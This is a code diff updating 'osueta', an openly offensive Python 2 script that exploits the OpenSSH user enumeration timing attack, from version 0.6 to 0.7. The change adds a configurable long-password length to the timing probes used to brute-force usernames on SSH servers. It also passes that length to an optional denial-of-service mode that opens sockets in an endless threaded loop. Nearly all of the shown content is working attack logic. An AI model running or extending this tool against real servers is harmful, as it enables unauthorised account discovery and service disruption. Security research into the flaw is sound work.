@@ -3,7 +3,7 @@
 __license__="""
 osueta (OpenSSH User Enumeration Timing Attack)
 
-Version 0.6
+Version 0.7
 
 A simple Python2 script to exploit the OpenSSH User Enumeration Timing Attack:
 
@@ -55,11 +55,12 @@ def main():
 	parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds (default 20 seconds).')
 	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the username (default yes).')
 	parse.add_argument('-o', action='store', dest='outp', help='Output file with positive results.')
+	parse.add_argument('-l', action='store', dest='length', help='Length of the password in characters (x1000) (default 40).')
 	parse.add_argument('-c', action='store', dest='vers', help='Check or not the OpenSSH version (default yes).')
 	parse.add_argument('--dos', action='store', dest='dos',default = 'no', help='Try to make a DOS attack (default no).')
 	parse.add_argument('-t', action='store', dest='threads',default = '5', help='Threads for the DOS attack (default 5).')
 	welcome()
-	print "Starting OSUETA v0.6 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X")
+	print "Starting OSUETA v0.7 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X")
 	print
 	start_time = time.time()
 	argus=parse.parse_args()
@@ -85,7 +86,7 @@ def main():
 			vers = 'yes'
 		if argus.outp != None:
 			fileOutput = open(argus.outp,'w')
-			fileOutput.write("OSUETA v0.5 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X") + "\n")
+			fileOutput.write("OSUETA v0.7 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X") + "\n")
 			fileOutput.write("\n")			
 			fileOutput.write("USER(s) FOUND:\n")
 			fileOutput.write("\n")
@@ -141,6 +142,8 @@ def main():
 
 		port = argus.port
   		vari = argus.vari
+		length = int(argus.length)*1000
+		print "[+] Using a password with " + str(length) + " characters"
 		dos = argus.dos
 		if dos == 'yes' and len(hosts) != 1:
 			print "[-] DOS option it's only valid for one host."
@@ -188,11 +191,11 @@ def main():
 						if banner[0:9] in bannervuln:
 							print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
 							print
-							print '======================================'
+							print '==============================================================================='
 							userNames = prepareUserNames(userFile,vari)            
 							for userName in userNames:
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-								fUser = sshTime(host,port,userName,sock,defTime)
+								fUser = sshTime(host,port,userName,sock,defTime,length)
 								if fUser != -1 and fUser !=None:
 									foundUser.append(fUser)
 								sock.close()
@@ -209,7 +212,7 @@ def main():
 						userNames = prepareUserNames(userFile,vari)            
 						for userName in userNames:
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-							fUser = sshTime(host,port,userName,sock,defTime)
+							fUser = sshTime(host,port,userName,sock,defTime,length)
 							if fUser != -1 and fUser !=None:
 								foundUser.append(fUser)
 							sock.close()
@@ -231,19 +234,19 @@ def main():
 						if banner[0:9] in bannervuln:
 							print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
 							print
-							print '======================================'
+							print '==============================================================================='
 							if vari == 'yes':
 								userNames =  createUserNameVariationsFor(user)
 								userNames = list(set(userNames))
 								for userName in userNames:
 									sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-									fUser = sshTime(host,port,userName,sock,defTime)
+									fUser = sshTime(host,port,userName,sock,defTime,length)
 									if fUser != -1 and fUser !=None:
 										foundUser.append(fUser)
 									sock.close()
 							if vari == 'no':
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-								fUser = sshTime(host,port,user,sock,defTime)
+								fUser = sshTime(host,port,user,sock,defTime,length)
 								if fUser != -1 and fUser !=None:
 									foundUser.append(fUser)
 								sock.close()
@@ -261,13 +264,13 @@ def main():
 							userNames = list(set(userNames))
 							for userName in userNames:
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-								fUser = sshTime(host,port,userName,sock,defTime)
+								fUser = sshTime(host,port,userName,sock,defTime,length)
 								if fUser != -1 and fUser !=None:
 									foundUser.append(fUser)
 								sock.close()
 						if vari == 'no':
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-							fUser = sshTime(host,port,user,sock,defTime)
+							fUser = sshTime(host,port,user,sock,defTime,length)
 							if fUser != -1 and fUser !=None:
 								foundUser.append(fUser)
 							sock.close()
@@ -286,7 +289,7 @@ def main():
 						while 1 : 
 	        					for att in range(threads):
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-								t = Thread(target=sshDos, args=(host, port, userfdos, sock, defTime))
+								t = Thread(target=sshDos, args=(host, port, userfdos, sock, length))
 		      						t.start()
 
 					else:
